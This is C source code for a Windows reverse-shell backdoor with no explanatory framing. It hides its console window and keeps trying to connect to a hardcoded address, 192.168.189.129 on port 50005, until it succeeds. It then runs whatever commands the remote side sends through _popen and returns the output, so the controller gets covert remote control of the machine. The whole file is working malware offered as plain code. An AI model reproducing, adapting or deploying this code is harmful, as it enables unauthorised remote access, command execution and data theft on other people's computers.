
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <winuser.h>
#include <string.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p , size)  (void) memset((p) , 0 ,(size))
int sock;


char *str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
              return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                 str_len = strlen(str);
                 if (abs(slice_to) > str_len - 1)
                         return NULL;

                 if (abs(slice_from) > str_len)
                         slice_from = (-1) * str_len;

                 buffer_len = slice_to - slice_from;
                 str += (str_len + slice_from);

        }
	 else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        }
	else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}


void Shell()  {
	char buffer[1024];
	char container[1024];
	char total_response[18384];
	
	while(1) {
		jump:
		bzero(buffer , sizeof(buffer));
		bzero(container , sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock , buffer,1024,0);
		if (strncmp("q" , buffer , 1)==0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		
		else if (strncmp("cd ",buffer,3)==0){
			chdir(str_cut(buffer,4,100));}
		else {
			FILE *fp;
			fp = _popen(buffer , "r");
			while(fgets(container , 1024,fp)!=NULL){
				strcat(total_response, container);
			}
			send(sock , total_response, sizeof(total_response),0);
			fclose(fp);
		}

	}

}

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdLine, int nCmdShow){

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass",NULL);
	
	ShowWindow(stealth,0);
	
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;
	ServIP = "192.168.189.129";
	ServPort = 50005;
	
	if (WSAStartup(MAKEWORD(2,0), &wsaData) !=0){
		exit(1);
	}

	sock = socket(AF_INET,SOCK_STREAM,0);

	memset(&ServAddr , 0 , sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

 	
	start:
	while (connect(sock,(struct sockaddr *) &ServAddr,sizeof(ServAddr))!=0){
		Sleep(10);
		goto start;

	}
	Shell();

}
